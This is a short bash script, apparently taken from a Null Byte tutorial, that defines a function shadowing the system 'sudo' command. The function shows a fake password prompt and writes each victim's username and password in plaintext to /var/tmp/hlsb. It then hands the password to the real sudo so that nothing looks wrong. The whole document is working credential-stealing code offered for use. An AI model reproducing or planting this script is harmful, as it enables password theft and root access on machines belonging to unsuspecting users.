#!/bin/bash
# via tokyoneon_
# https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/

function sudo () { 
  realsudo="$(which sudo)" 
  read -s -p "[sudo] password for $USER: " inputPasswd 
  printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /var/tmp/hlsb 
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1 
  $realsudo "${@:1}" 
} 
